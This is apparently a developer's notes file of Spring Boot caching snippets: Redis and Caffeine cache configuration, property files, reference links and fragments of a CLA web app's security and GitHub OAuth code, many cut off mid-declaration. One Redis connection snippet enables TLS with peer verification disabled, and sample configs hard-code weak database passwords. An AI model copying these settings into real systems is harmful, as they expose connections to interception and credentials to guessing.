 * You may obtain a copy of the License at
 *
 *        http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.spring.cache;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.Arrays;
import java.util.Properties;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.annotation.PostConstruct;

import org.junit.Before;
import org.junit.FixMethodOrder;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.MethodSorters;
import org.spring.cache.CachingWithRedisIntegrationTest.CachingWithRedisConfiguration;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringBootConfiguration;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.cache.CacheManager;
import org.springframework.cache.annotation.Cacheable;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.cache.concurrent.ConcurrentMapCacheManager;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Import;
import org.springframework.context.annotation.Profile;
import org.springframework.context.support.PropertySourcesPlaceholderConfigurer;
import org.springframework.data.redis.cache.RedisCacheManager;
import org.springframework.data.redis.connection.jedis.JedisConnectionFactory;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.util.Assert;

/**
 * Integration tests testing Spring's Cache Abstraction using Spring Data Redis auto-configured with Spring Boot.
 *
 * To run this test, first start a Redis Server on localhost listening on the default port, 6379.
 *
 * @author John Blum
 * @see org.junit.Test
 * @since 1.0.0
 */
@RunWith(SpringRunner.class)
@ActiveProfiles("auto")
@FixMethodOrder(MethodSorters.NAME_ASCENDING)
@ContextConfiguration(classes = CachingWithRedisConfiguration.class)
@SuppressWarnings("unused")
public class CachingWithRedisIntegrationTest {

  protected static final int REDIS_PORT = 6379;
  protected static final String REDIS_HOST = "localhost";

  private AtomicBoolean setup = new AtomicBoolean(false);

  @Autowired
  private MathService mathService;

  @Autowired(required = false)
  private RedisTemplate<Object, Object> redisTemplate;

  @Before
  public void setup() {
    if (redisTemplate != null && !setup.getAndSet(true)) {
      redisTemplate.delete(Arrays.asList(0L, 1L, 2L, 4L, 8L));
    }
  }

  @Test
  public void firstCacheMisses() {
    assertThat(mathService.factorial(0L)).isEqualTo(1L);
    assertThat(mathService.wasCacheMiss()).isTrue();
    assertThat(mathService.factorial(1L)).isEqualTo(1L);
    assertThat(mathService.wasCacheMiss()).isTrue();
    assertThat(mathService.factorial(2L)).isEqualTo(2L);
    assertThat(mathService.wasCacheMiss()).isTrue();
    assertThat(mathService.factorial(4L)).isEqualTo(24L);
    assertThat(mathService.wasCacheMiss()).isTrue();
    assertThat(mathService.factorial(8L)).isEqualTo(40320L);
    assertThat(mathService.wasCacheMiss()).isTrue();
  }

  @Test
  public void thenCacheHits() {
    assertThat(mathService.factorial(0L)).isEqualTo(1L);
    assertThat(mathService.wasCacheMiss()).isFalse();
    assertThat(mathService.factorial(1L)).isEqualTo(1L);
    assertThat(mathService.wasCacheMiss()).isFalse();
    assertThat(mathService.factorial(2L)).isEqualTo(2L);
    assertThat(mathService.wasCacheMiss()).isFalse();
    assertThat(mathService.factorial(4L)).isEqualTo(24L);
    assertThat(mathService.wasCacheMiss()).isFalse();
    assertThat(mathService.factorial(8L)).isEqualTo(40320L);
    assertThat(mathService.wasCacheMiss()).isFalse();
  }

  interface MathService {
    boolean wasCacheMiss();
    long factorial(long number);
  }

  @EnableCaching
  @SpringBootConfiguration
  @Import({ AutoRedisConfiguration.class, CustomRedisConfiguration.class })
  static class CachingWithRedisConfiguration {

    @Bean
    MathService mathService() {
      return new MathService() {
        private final AtomicBoolean cacheMiss = new AtomicBoolean(false);

        @Override
        public boolean wasCacheMiss() {
          return cacheMiss.getAndSet(false);
        }

        @Override
        @Cacheable(cacheNames = "Factorials")
        public long factorial(long number) {
          cacheMiss.set(true);

          Assert.isTrue(number >= 0L, String.format("Number [%d] must be greater than equal to 0", number));

          if (number <= 2L) {
            return (number < 2L ? 1L : 2L);
          }

          long result = number;

          while (--number > 1) {
            result *= number;
          }

          return result;
        }
      };
    }

    @Bean
    @Profile("none")
    CacheManager cacheManager() {
      return new ConcurrentMapCacheManager();
    }
  }

  @Profile("auto")
  @EnableAutoConfiguration
  @SpringBootConfiguration
  static class AutoRedisConfiguration {

    @PostConstruct
    public void afterPropertiesSet() {
      System.out.println("AUTO");
    }

    @Bean
    static PropertySourcesPlaceholderConfigurer propertyPlaceholderConfigurer() {
      PropertySourcesPlaceholderConfigurer propertySourcesPlaceholderConfigurer =
        new PropertySourcesPlaceholderConfigurer();
      propertySourcesPlaceholderConfigurer.setProperties(redisProperties());
      return propertySourcesPlaceholderConfigurer;
    }

    static Properties redisProperties() {
      Properties redisProperties = new Properties();

      redisProperties.setProperty("spring.cache.type", "redis");
      redisProperties.setProperty("spring.redis.host", REDIS_HOST);
      redisProperties.setProperty("spring.redis.port", String.valueOf(REDIS_PORT));

      return redisProperties;
    }
  }

  @Profile("custom")
  @SpringBootConfiguration
  static class CustomRedisConfiguration {

    @PostConstruct
    public void afterPropertiesSet() {
      System.out.println("CUSTOM");
    }

    @Bean
    JedisConnectionFactory jedisConnectionFactory() {
      JedisConnectionFactory factory = new JedisConnectionFactory();
      factory.setHostName(REDIS_HOST);
      factory.setPort(REDIS_PORT);
      factory.setUsePool(true);
      return factory;
    }

    @Bean
    RedisTemplate<Object, Object> redisTemplate() {
      RedisTemplate<Object, Object> redisTemplate = new RedisTemplate<>();
      redisTemplate.setConnectionFactory(jedisConnectionFactory());
      return redisTemplate;
    }

    @Bean
    CacheManager cacheManager() {
      RedisCacheManager cacheManager = new RedisCacheManager(redisTemplate());
      cacheManager.setUsePrefix(true); // THIS IS NEEDED!
      return cacheManager;
    }
  }
}



@Bean
  public LettuceConnectionFactory redisConnectionFactory() {
    RedisStandaloneConfiguration configuration = new RedisStandaloneConfiguration();
    configuration.setHostName(redisHost);
    configuration.setPort(redisPort);
    return new LettuceConnectionFactory(configuration,            LettuceClientConfiguration.builder().useSsl().disablePeerVerification().build());
  }
  
  
  @Configuration
@EnableCaching
public class CachingConfig {
 
    @Bean
    public CacheManager cacheManager() {
        return new ConcurrentMapCacheManager("addresses");
    }
}
@Component
public class SimpleCacheCustomizer implements CacheManagerCustomizer<ConcurrentMapCacheManager> {
 
    @Override
    public void customize(ConcurrentMapCacheManager cacheManager) {
        cacheManager.setCacheNames(asList("users", "transactions"));
    }
}

https://www.baeldung.com/spring-cache-tutorial

@Cacheable(value = "post-single", key = "#id", unless = "#result.shares < 500")
@GetMapping("/{id}")
public Post getPostByID(@PathVariable String id) throws PostNotFoundException {
    log.info("get post with id {}", id);
    return postService.getPostByID(id);
}
@Cacheable(value = "post-top")
@GetMapping("/top")
public List<Post> getTopPosts() {
    return postService.getTopPosts();
}

#memory limit up to 128MB (up to you)
maxmemory 128mb
#remove the last recently used (LRU) keys first
maxmemory-policy allkeys-lru
#eviction precision (up to you)
maxmemory-samples 10


https://medium.com/@MatthewFTech/spring-boot-cache-with-redis-56026f7da83a


#Redis specific configurations

spring.redis.host=localhost
spring.redis.port=6379
spring.redis.password= 

spring.redis.lettuce.pool.max-active=7 
spring.redis.lettuce.pool.max-idle=7
spring.redis.lettuce.pool.min-idle=2
spring.redis.lettuce.pool.max-wait=-1ms
spring.redis.lettuce.shutdown-timeout=200ms

spring.cache.redis.cache-null-values=false
spring.cache.redis.time-to-live=600000
spring.cache.redis.use-key-prefix=true

spring.cache.type=redis
#spring.cache.cache-names=articleCache,allArticlesCache

#Database specific configurations 

spring.datasource.url=jdbc:mysql://localhost:3306/concretepage
spring.datasource.username=root
spring.datasource.password=cp

spring.datasource.hikari.connection-timeout=20000
spring.datasource.hikari.minimum-idle=5
spring.datasource.hikari.maximum-pool-size=12
spring.datasource.hikari.idle-timeout=300000
spring.datasource.hikari.max-lifetime=1200000

spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect
spring.jpa.properties.hibernate.id.new_generator_mappings=false
spring.jpa.properties.hibernate.format_sql=true 



<dependency>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-starter-data-redis</artifactId>
</dependency>		
<dependency>
  <groupId>org.apache.commons</groupId>
  <artifactId>commons-pool2</artifactId>
</dependency> 
https://www.8host.com/blog/nastrojka-keshirovaniya-redis-dlya-uskoreniya-wordpress/
https://www.concretepage.com/spring-boot/spring-boot-redis-cache
https://www.javacodegeeks.com/2013/02/caching-with-spring-data-redis.html
https://memorynotfound.com/spring-redis-cache-manager-example/
https://docs.spring.io/spring-boot/docs/current/reference/html/boot-features-caching.html
https://github.com/SimpleProgramming/springboot-redis-database-and-cache
https://www.onlinetutorialspoint.com/spring-boot/spring-boot-redis-cache-example-redis-server.html
https://www.programcreek.com/python/example/3104/redis.Redis
https://javabeat.net/enablecaching-spring/
https://www.codota.com/code/java/packages/org.springframework.boot.autoconfigure.data.redis
--------------------------------------------------------------------------------------------------------
@Bean
	@ConditionalOnMissingBean(RedisConnectionFactory.class)
	public RedisConnectionFactory redisConnectionFactory(RedisProperties redisProperties) {

		LettuceConnectionFactory connectionFactory = new LettuceConnectionFactory();
		connectionFactory.setPort(redisProperties.getPort());
		connectionFactory.setHostName(redisProperties.getHost());
		connectionFactory.setPassword(redisProperties.getPassword());
		connectionFactory.setShutdownTimeout(0);

		return connectionFactory;
	}
--------------------------------------------------------------------------------------------------------

import java.io.IOException;
import java.util.LinkedHashMap;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.security.access.AccessDeniedException;
import org.springframework.security.authentication.InsufficientAuthenticationException;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.web.AuthenticationEntryPoint;
import org.springframework.security.web.access.AccessDeniedHandler;
import org.springframework.security.web.access.AccessDeniedHandlerImpl;
import org.springframework.security.web.authentication.DelegatingAuthenticationEntryPoint;
import org.springframework.security.web.authentication.HttpStatusEntryPoint;
import org.springframework.security.web.authentication.www.BasicAuthenticationEntryPoint;
import org.springframework.security.web.savedrequest.HttpSessionRequestCache;
import org.springframework.security.web.util.matcher.AntPathRequestMatcher;
import org.springframework.security.web.util.matcher.RequestMatcher;
import org.springframework.web.cors.CorsUtils;

import io.pivotal.cla.data.User;
import io.pivotal.cla.security.GitHubAuthenticationEntryPoint;

@EnableWebSecurity
@EnableGlobalMethodSecurity(prePostEnabled = true)
public class SecurityConfig extends WebSecurityConfigurerAdapter {
	@Autowired
	ClaOAuthConfig oauthConfig;

	@Override
	protected void configure(HttpSecurity http) throws Exception {
		AuthenticationEntryPoint entryPoint = entryPoint();
		AdminRequestedAccessDeniedHandler accessDeniedHandler = new AdminRequestedAccessDeniedHandler(entryPoint);
		http
			.requiresChannel()
				.requestMatchers(request -> request.getHeader("x-forwarded-port") != null).requiresSecure()
				.and()
			.exceptionHandling()
				.authenticationEntryPoint(entryPoint)
				.accessDeniedHandler(accessDeniedHandler)
				.and()
			.csrf()
				.ignoringAntMatchers("/github/hooks/**").and()
			.authorizeRequests()
				.requestMatchers(CorsUtils::isPreFlightRequest).permitAll()
				.mvcMatchers("/login/**", "/", "/about", "/faq").permitAll()
				.mvcMatchers("/view/**").permitAll()
				.mvcMatchers("/webjars/**", "/assets/**").permitAll()
				.mvcMatchers("/github/hooks/**").permitAll()
				.mvcMatchers("/admin","/admin/cla/link/**","/admin/help/**").hasRole("ADMIN")
				.mvcMatchers("/admin/**","/manage/**").hasRole("CLA_AUTHOR")
				.anyRequest().authenticated()
				.and()
			.logout()
				.logoutSuccessUrl("/?logout");
	}

	static class AdminRequestedAccessDeniedHandler implements AccessDeniedHandler {
		private AuthenticationEntryPoint entryPoint;

		private AccessDeniedHandler deniedHandler;

		private AdminRequestedAccessDeniedHandler(AuthenticationEntryPoint entryPoint) {
			AccessDeniedHandlerImpl deniedHandler = new AccessDeniedHandlerImpl();
			deniedHandler.setErrorPage("/error/403");
			this.deniedHandler = deniedHandler;
			this.entryPoint = entryPoint;
		}

		@Override
		public void handle(HttpServletRequest request, HttpServletResponse response,
				AccessDeniedException accessDeniedException) throws IOException, ServletException {
			User currentUser = getUser(SecurityContextHolder.getContext().getAuthentication());

			if (currentUser == null || currentUser.isAdminAccessRequested()) {
				deniedHandler.handle(request, response, accessDeniedException);
				return;
			}

			new HttpSessionRequestCache().saveRequest(request, response);
			entryPoint.commence(request, response,
					new InsufficientAuthenticationException("Additional OAuth Scopes required", accessDeniedException));
		}

		private User getUser(Authentication authentication) {

			if (authentication != null && authentication.getPrincipal() instanceof User) {
				return (User) authentication.getPrincipal();
			}

			return null;
		}
	}


	private AuthenticationEntryPoint entryPoint() {
		LinkedHashMap<RequestMatcher, AuthenticationEntryPoint> entryPoints = new LinkedHashMap<>();
		entryPoints.put(new AntPathRequestMatcher("/github/hooks/**"), new HttpStatusEntryPoint(HttpStatus.UNAUTHORIZED));
		entryPoints.put(new AntPathRequestMatcher("/admin/**"), new GitHubAuthenticationEntryPoint(oauthConfig.getMain(), "user:email,repo:status,admin:repo_hook,admin:org_hook,read:org"));
		BasicAuthenticationEntryPoint basicEntryPoint = new BasicAuthenticationEntryPoint();
		basicEntryPoint.setRealmName("Pivotal CLA");
		entryPoints.put(new AntPathRequestMatcher("/manage/**"), basicEntryPoint);
		DelegatingAuthenticationEntryPoint entryPoint = new DelegatingAuthenticationEntryPoint(entryPoints);
		entryPoint.setDefaultEntryPoint(new GitHubAuthenticationEntryPoint(oauthConfig.getMain(), "user:email"));
		return entryPoint;
	}
}

import java.util.List;

import org.springframework.context.annotation.Configuration;
import org.springframework.web.method.support.HandlerMethodArgumentResolver;
import org.springframework.web.servlet.config.annotation.ViewControllerRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;

import io.pivotal.cla.mvc.support.ImportedSignaturesSessionAttrResolver;

/**
 * @author Rob Winch
 *
 */
@Configuration
public class WebMvcConfig extends WebMvcConfigurerAdapter {

	/* (non-Javadoc)
	 * @see org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter#addArgumentResolvers(java.util.List)
	 */
	@Override
	public void addArgumentResolvers(List<HandlerMethodArgumentResolver> resolvers) {
		resolvers.add(new ImportedSignaturesSessionAttrResolver());
	}

	@Override
	public void addViewControllers(ViewControllerRegistry registry) {
		registry.addViewController("/error/403").setViewName("error/403");
	}
}


import javax.sql.DataSource;

import org.springframework.cloud.Cloud;
import org.springframework.cloud.CloudFactory;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import org.springframework.util.Assert;

/**
 * @author Mark Paluch
 */
public abstract class DatabaseConfig {

	@Bean
	public abstract DataSource dataSource();

	protected void configureDataSource(org.apache.tomcat.jdbc.pool.DataSource dataSource) {
		dataSource.setMaxActive(20);
		dataSource.setMaxIdle(8);
		dataSource.setMinIdle(8);
		dataSource.setTestOnBorrow(true);
		dataSource.setTestOnReturn(false);
	}
}

@Configuration
@Profile(GitHubClaProfiles.LOCAL)
class LocalDatabaseConfig extends DatabaseConfig {

	@Bean
	public DataSource dataSource() {
		org.apache.tomcat.jdbc.pool.DataSource dataSource = new org.apache.tomcat.jdbc.pool.DataSource();

		dataSource.setDriverClassName("org.h2.Driver");
		dataSource.setUrl("jdbc:h2:mem:pivotalcla;MODE=MySQL;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE");
		dataSource.setUsername("sa");
		dataSource.setPassword("");
		dataSource.setValidationQuery("SELECT 1");

		configureDataSource(dataSource);

		return dataSource;
	}
}

@Configuration
@Profile(GitHubClaProfiles.LOCAL_MYSQL)
class LocalMysqlDatabaseConfig extends DatabaseConfig {

	@Bean
	public DataSource dataSource() {
		org.apache.tomcat.jdbc.pool.DataSource dataSource = new org.apache.tomcat.jdbc.pool.DataSource();

		dataSource.setDriverClassName("com.mysql.jdbc.Driver");
		dataSource.setUrl("jdbc:mysql://localhost:3306/pivotalcla");
		dataSource.setUsername("spring");
		dataSource.setPassword("password");
		dataSource.setValidationQuery("SELECT 1");

		configureDataSource(dataSource);

		return dataSource;
	}
}

@Configuration
@Profile(GitHubClaProfiles.CLOUDFOUNDRY)
class CloudFoundryDatabaseConfig extends DatabaseConfig {

	@Bean
	public Cloud cloud() {
		return new CloudFactory().getCloud();
	}

	@Bean
	public DataSource dataSource() {

		DataSource service = cloud().getSingletonServiceConnector(DataSource.class, null);
		Assert.isInstanceOf(org.apache.tomcat.jdbc.pool.DataSource.class, service);
		org.apache.tomcat.jdbc.pool.DataSource dataSource = (org.apache.tomcat.jdbc.pool.DataSource) service;

		dataSource.setValidationQuery("/* PING */ SELECT 1");
		configureDataSource(dataSource);
		return dataSource;
	}
}


@Entity
@Data
@ToString(exclude = {"individualContent","corporateContent"})

@ElementCollection
@Column(name = "email")
@CollectionTable(name = "user_email",
		joinColumns = @JoinColumn(name = "github_login") )
Set<String> emails;
	
@Query("select s from CorporateSignature s where (s.cla.name = :claName or s.cla.name in (select distinct c.supersedingCla.name from ContributorLicenseAgreement c where c.name = :#{#claName})) and (s.gitHubOrganization in (:organizations) or s.emailDomain in (:emailDomains))")
	List<CorporateSignature> findSignatures(Pageable pageable, @Param("claName") String claName, @Param("organizations") Collection<String> organizations, @Param("emailDomains") Collection<String> emailDomains);

	@Query("select s from CorporateSignature s where (s.gitHubOrganization in (:organizations) or s.emailDomain in (:emailDomains))")
	List<CorporateSignature> findSignaturesByOrganizationsAndEmailDomains(Pageable pageable, @Param("organizations") Collection<String> organizations, @Param("emailDomains") Collection<String> emailDomains);
--------------------------------------------------------------------------------------------------------
@Bean
    public JCacheCacheManager cacheManager(CacheManager jCacheCacheManager) {
        return new JCacheCacheManager(jCacheCacheManager);
    }
	@Bean
    @ConditionalOnMissingBean
    public CacheManager jCacheCacheManager() throws IOException {
        CacheManager jCacheCacheManager = createCacheManager();
        List<String> cacheNames = this.cacheProperties.getCacheNames();
        if (!CollectionUtils.isEmpty(cacheNames)) {
            for (String cacheName : cacheNames) {
                jCacheCacheManager.createCache(cacheName, getDefaultCacheConfiguration());
            }
        }
        customize(jCacheCacheManager);
        return jCacheCacheManager;
    }
	
private String syncUrl() throws Exception {
		ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
		HttpServletRequest request = requestAttributes.getRequest();
		return UrlBuilder.createSyncUrl(request, claName, repositoryId, pullRequestId);
	}
	

	if (updatePullRequest != null) {
			updatePullRequest.getCommitStatus().setAdmin(currentUser.isAdmin());
			claService.savePullRequestStatus(updatePullRequest);
		}

		String repositoryOwner = repositoryParts[0];
		String repositoryName = repositoryParts[1];

		redirect.addAttribute("repositoryOwner", repositoryOwner);
		redirect.addAttribute("repositoryName", repositoryName);
		redirect.addAttribute("pullRequestId", claRequest.getPullRequestId());
		return "redirect:https://github.com/{repositoryOwner}/{repositoryName}/pull/{pullRequestId}";
--------------------------------------------------------------------------------------------------------
import org.eclipse.egit.github.core.Repository;

/**
 * @author Mark Paluch
 */
public interface RepositoryAware {

	Repository getRepository();
}
--------------------------------------------------------------------------------------------------------
@ModelAttribute("currentUser")
	User currentUser(@AuthenticationPrincipal User currentUser) {
		return currentUser;
	}

	@ModelAttribute("isAdmin")
	boolean isAdmin(@AuthenticationPrincipal User currentUser) {
		return currentUser == null ? false : currentUser.isAdmin();
	}

	@ModelAttribute("isClaAuthor")
	boolean isClaAuthor(@AuthenticationPrincipal User currentUser) {
		return currentUser == null ? false : currentUser.isClaAuthor();
	}
	
@SuppressWarnings("serial")
--------------------------------------------------------------------------------------------------------

import java.io.IOException;
import java.util.UUID;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.security.core.AuthenticationException;
import org.springframework.security.web.AuthenticationEntryPoint;
import org.springframework.web.util.UriComponentsBuilder;

import io.pivotal.cla.config.OAuthClientCredentials;
import io.pivotal.cla.mvc.util.UrlBuilder;
import lombok.AllArgsConstructor;

@AllArgsConstructor
public class GitHubAuthenticationEntryPoint implements AuthenticationEntryPoint {
	OAuthClientCredentials config;
	String scope;

	public void commence(HttpServletRequest request, HttpServletResponse response,
			AuthenticationException authException) throws IOException, ServletException {

		String secretState = statePrefix() + UUID.randomUUID().toString();

		request.getSession().setAttribute("state", secretState);

		String callbackUrl = UrlBuilder.fromRequest(request).callbackUrl();
		String redirectUrl = UriComponentsBuilder.fromHttpUrl("https://github.com/login/oauth/authorize")
			.queryParam("client_id", config.getClientId())
			.queryParam("redirect_uri", callbackUrl)
			.queryParam("state", secretState)
			.queryParam("scope", scope)
			.build()
			.toUriString();

		response.sendRedirect(redirectUrl);
	}

	public static boolean isAdmin(String secretState) {
		return secretState != null && secretState.startsWith("ADMIN");
	}

	private String statePrefix() {
		return scope.contains("repo:status") ? "ADMIN" : "USER";
	}
}

private static final String HMAC_SHA1_ALGORITHM = "HmacSHA1";

import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.codec.Hex;
import org.springframework.stereotype.Component;

import io.pivotal.cla.data.AccessToken;
import io.pivotal.cla.data.repository.AccessTokenRepository;
import lombok.SneakyThrows;

/**
 * @author Rob Winch
 *
 */
@Component
public class GitHubSignature {
	static final String SIGNATURE_PREFIX = "sha1=";

	private static final String HMAC_SHA1_ALGORITHM = "HmacSHA1";

	AccessTokenRepository accessTokens;

	@Autowired
	public GitHubSignature(AccessTokenRepository accessTokens) {
		super();
		this.accessTokens = accessTokens;
	}

	@SneakyThrows
	public boolean check(String gitHubSignature, String body) {
		if(gitHubSignature == null || !gitHubSignature.startsWith(SIGNATURE_PREFIX)) {
			return false;
		}
		AccessToken expectedToken = accessTokens.findOne(AccessToken.CLA_ACCESS_TOKEN_ID);
		if(expectedToken == null) {
			return false;
		}

		String providedHmac = gitHubSignature.substring(SIGNATURE_PREFIX.length());

		byte[] providedHmacBytes = Hex.decode(providedHmac);

		byte[] expectedBytes = sign(body, expectedToken.getToken());

		return MessageDigest.isEqual(providedHmacBytes, expectedBytes);
	}

	@SneakyThrows
	public String create(String body, String token) {
		return SIGNATURE_PREFIX + new String(Hex.encode(sign(body, token)));
	}

	private byte[] sign(String body, String token)
			throws NoSuchAlgorithmException, InvalidKeyException {
		SecretKeySpec signingKey = new SecretKeySpec(token.getBytes(), HMAC_SHA1_ALGORITHM);
		Mac mac = Mac.getInstance(HMAC_SHA1_ALGORITHM);
		mac.init(signingKey);
		byte[] expectedBytes = mac.doFinal(body.getBytes());
		return expectedBytes;
	}
}

public static Authentication loginAs(User user) {
		SecurityContext context = SecurityContextHolder.createEmptyContext();
		UserAuthentication authentication = new UserAuthentication(user);
		context.setAuthentication(authentication);
		SecurityContextHolder.setContext(context);
		return authentication;
	}
--------------------------------------------------------------------------------------------------------
initialCapacity=100,maximumSize=500,expireAfterAccess=5m,recordStats
--------------------------------------------------------------------------------------------------------
@SpringBootApplication

@EnableTransactionManagement

@EnableCaching

@EnableScheduling

@EnableAsync

public class Application {

 

    String redisHost = "localhost";

    int redisPort = 6379;

 

    public static void main(String[] args) {

        SpringApplication.run(Application.class, args);

    }

    @Bean

    JedisConnectionFactory jedisConnectionFactory() {

        JedisConnectionFactory factory = new JedisConnectionFactory();

        factory.setHostName(redisHost);

        factory.setPort(redisPort);

        factory.setUsePool(true);

        return factory;

    }

    @Bean

    RedisTemplate<Object, Object> redisTemplate() {

        RedisTemplate<Object, Object> redisTemplate = new RedisTemplate<Object, Object>();

        redisTemplate.setConnectionFactory(jedisConnectionFactory());

        return redisTemplate;

    }

    @Bean

    public CacheManager cacheManager() {

        RedisCacheManager cacheManager = new RedisCacheManager(redisTemplate());

        return cacheManager;

    }

}
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.crmmailadapter.system.configuration;

import com.github.benmanes.caffeine.cache.Caffeine;
import com.github.benmanes.caffeine.cache.CaffeineSpec;
import com.github.benmanes.caffeine.cache.RemovalCause;
import com.github.benmanes.caffeine.cache.RemovalListener;
import lombok.extern.slf4j.Slf4j;
import org.springframework.cache.CacheManager;
import org.springframework.cache.caffeine.CaffeineCacheManager;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Description;
import org.springframework.context.annotation.Primary;
import org.springframework.data.redis.cache.RedisCacheConfiguration;
import org.springframework.data.redis.cache.RedisCacheManager;
import org.springframework.data.redis.connection.RedisConnectionFactory;

import java.time.Duration;
import java.util.concurrent.TimeUnit;

import static java.util.Collections.singletonMap;

@Slf4j
@Configuration
@Description("Paragon MailingContour CRM mail adapter cache configuration")
public class CacheConfiguration {
    private static final String MAIL_FOLDER_CACHE = "MAIL_FOLDER_CACHE";
    private static final String MAIL_STORE_CACHE = "MAIL_STORE_CACHE";

//    @Bean
//    public CacheManagerCustomizer<CaffeineCacheManager> caffeineCacheManager() {
//        return cacheManager -> cacheManager.setCaffeine(Caffeine.newBuilder().expireAfterWrite(1, TimeUnit.MINUTES));
//    }

//    @Bean
//    public Cache caffeineCache() {
//        return new CaffeineCache("my-cache", Caffeine.newBuilder().maximumSize(10).build());
//    }
//
//    @Bean
//    public Cache redisCache() {
//        return new CaffeineCache("my-cache", Caffeine.newBuilder().maximumSize(10).build());
//    }

//    @Bean
//    @DependsOn({"redisConnectionFactory"})
//    public RedisTemplate<byte[], byte[]> redisTemplate(final RedisConnectionFactory redisConnectionFactory) {
//        final RedisTemplate<byte[], byte[]> redisTemplate = new RedisTemplate<>();
//        redisTemplate.setConnectionFactory(redisConnectionFactory);
//        redisTemplate.setEnableTransactionSupport(true);
//        redisTemplate.afterPropertiesSet();
//        return redisTemplate;
//    }

    @Bean
    @Primary
    public CacheManager redisCacheManager(final RedisConnectionFactory redisConnectionFactory) {
        final RedisCacheManager.RedisCacheManagerBuilder redisCacheManagerBuilder = RedisCacheManager.RedisCacheManagerBuilder.fromConnectionFactory(redisConnectionFactory);
        redisCacheManagerBuilder.transactionAware().withInitialCacheConfigurations(singletonMap("registry", this.getRedisCacheConfiguration()));
        return redisCacheManagerBuilder.build();
    }

    private RedisCacheConfiguration getRedisCacheConfiguration() {
        final RedisCacheConfiguration redisCacheConfiguration = RedisCacheConfiguration.defaultCacheConfig();
        redisCacheConfiguration.usePrefix();
        redisCacheConfiguration.prefixKeysWith("Registry:");
        redisCacheConfiguration.entryTtl(Duration.ofDays(1));
        redisCacheConfiguration.disableCachingNullValues();
        return redisCacheConfiguration;
    }

    @Bean
    public CacheManager caffeineCacheManager() {
        final CaffeineCacheManager cacheManager = new CaffeineCacheManager(MAIL_FOLDER_CACHE, MAIL_STORE_CACHE);
        cacheManager.setAllowNullValues(false);
        cacheManager.setCaffeineSpec(this.caffeineSpec());
        cacheManager.setCaffeine(this.caffeineCacheBuilder());
        return cacheManager;
    }

    private CaffeineSpec caffeineSpec() {
        return CaffeineSpec.parse("initialCapacity=10,maximumSize=7000,expireAfterWrite=300s");
    }

    private Caffeine<Object, Object> caffeineCacheBuilder() {
        return Caffeine.newBuilder()
                .initialCapacity(100)
                .maximumSize(150)
                .expireAfterAccess(5, TimeUnit.MINUTES)
                .weakKeys()
                .removalListener(this.caffeineRemovalListener())
                .recordStats();
    }

    @Bean
    public CustomRemovalListener caffeineRemovalListener() {
        return new CustomRemovalListener();
    }

    private class CustomRemovalListener implements RemovalListener<Object, Object> {
        @Override
        public void onRemoval(Object key, Object value, RemovalCause cause) {
            log.info("Caffeine cache removal listener called with key [%s], cause [%s], evicted [%S]", key, cause.toString(), cause.wasEvicted());
        }
    }
}
--------------------------------------------------------------------------------------------------------
       <dependency>
            <groupId>javax.cache</groupId>
            <artifactId>cache-api</artifactId>
            <version>${cache-api.version}</version>
        </dependency>
--------------------------------------------------------------------------------------------------------
import java.util.Collection;
import java.util.List;

import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.AuthorityUtils;
import org.springframework.security.core.context.SecurityContext;
import org.springframework.security.core.context.SecurityContextHolder;

import io.pivotal.cla.data.User;

public class Login {

	public static Authentication loginAs(User user) {
		SecurityContext context = SecurityContextHolder.createEmptyContext();
		UserAuthentication authentication = new UserAuthentication(user);
		context.setAuthentication(authentication);
		SecurityContextHolder.setContext(context);
		return authentication;
	}

	static class UserAuthentication implements Authentication {
		private static final List<GrantedAuthority> ADMIN_ROLES = AuthorityUtils.createAuthorityList("ROLE_USER", "ROLE_ADMIN");

		private static final List<GrantedAuthority> CLA_AUTHOR_ROLES = AuthorityUtils.createAuthorityList("ROLE_USER", "ROLE_ADMIN", "ROLE_CLA_AUTHOR", "ACTUATOR");

		private static final List<GrantedAuthority> USER_ROLES = AuthorityUtils.createAuthorityList("ROLE_USER");

		private static final long serialVersionUID = 4717809728702726728L;

		final User user;

		public UserAuthentication(User user) {
			this.user = user;
		}

		@Override
		public String getName() {
			return String.valueOf(user.getGitHubLogin());
		}

		@Override
